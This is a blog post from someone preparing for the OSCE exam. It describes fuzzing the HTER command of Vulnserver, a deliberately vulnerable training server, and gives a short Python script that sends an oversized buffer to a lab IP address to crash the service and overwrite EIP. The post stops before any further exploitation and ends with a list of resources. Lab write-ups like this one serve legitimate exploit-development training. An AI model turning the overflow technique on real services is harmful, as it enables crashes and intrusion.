---
layout: single
title: CTP/OSCE Prep -- Boofuzzing Vulnserver for EIP Overwrite
date: 2019-6-04
classes: wide
header:
  teaser: /assets/images/CTP/immunity.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
  - OSCE
  - CTP
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

This particular post is about exploiting the 'HTER' command on Vulnserver. 

## Fuzzing

Long story short here, Boofuzz was giving me all kinds of different payloads which were all crashing the application but none of them were consistent. The only thing I picked up from the fuzzing payloads was:
1. Our application is vulnerable to a buffer overflow
2. All the payloads were prepended with: `"HTER "`

So I started to manually fuzz the application with just our skeleton exploit python script we've been using starting with a payload of: `'A' * 1000` and working my way up. 

The application started to crash when I got to `'A' * 3000`
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

buffer = 'A' * 3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("HTER " + buffer)
print s.recv(1024)
s.close()
```
Then I saw *this in EIP. 

![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Resources

+ [Do Buffer Overflow Good](https://github.com/justinsteven/dostackbufferoverflowgood)
+ [Finding Bad Characters](https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/)
+ [Intro to Boofuzz](https://zeroaptitude.com/zerodetail/fuzzing-with-boofuzz/)
+ [Vulnserver EIP Overwrite](https://captmeelo.com/exploitdev/osceprep/2018/06/27/vulnserver-trun.html)
+ [Vulnserver LTER EIP Overwrite](https://www.doyler.net/security-not-included/vulnserver-lter-eip-overwrite)
+ [Mona Guide](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
+ [Immunity Debugger Basics](https://hsploit.com/immunity-debugger-basics/)
+ [Wallpaper](https://imgur.com/0S9DVnQ)
